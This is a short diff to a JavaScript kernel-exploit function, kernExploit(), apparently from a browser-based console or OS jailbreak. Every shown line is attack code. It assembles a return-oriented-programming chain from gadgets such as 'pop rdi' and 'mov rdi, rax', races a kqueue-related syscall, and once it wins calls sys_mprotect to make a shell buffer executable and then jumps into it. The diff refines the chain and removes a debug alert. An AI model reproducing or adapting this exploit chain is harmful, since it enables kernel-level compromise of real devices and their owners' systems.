-      race.push(window.gadgets["pop rdi"]);
-      race.push(0);
-      race.push(window.gadgets["add rdi, rax"]);
+      race.push(window.gadgets["mov rdi, rax"]);
       race.push(window.gadgets["pop rsi"]);
       race.push(kev);
       race.push(window.gadgets["pop rdx"]);
@@ -621,19 +401,15 @@ function kernExploit() {
       race.push(window.gadgets["pop rax"]);
       race.push(kq);
       race.push(window.gadgets["mov rax, [rax]"]);
-      race.push(window.gadgets["pop rdi"]);
-      race.push(0);
-      race.push(window.gadgets["add rdi, rax"]);
+      race.push(window.gadgets["mov rdi, rax"]);
       race.push(window.syscalls[6]);
       iters++;
 
       // Gotta go fast!
       race.run();
-
       if (kscratch.backing[0] != 0) {
         // Hey, we won!
-		//alert("Hey, we won!");
-				
+
         // Clean up memory
         p.syscall("sys_mprotect", shellbuf, 0x4000, 7);
         p.fcall(shellbuf);
@@ -641,7 +417,7 @@ function kernExploit() {
         // Refresh to a clean page
         location.reload();
 
-		return true;
+        return true;
       }
     }
   } catch(ex) {
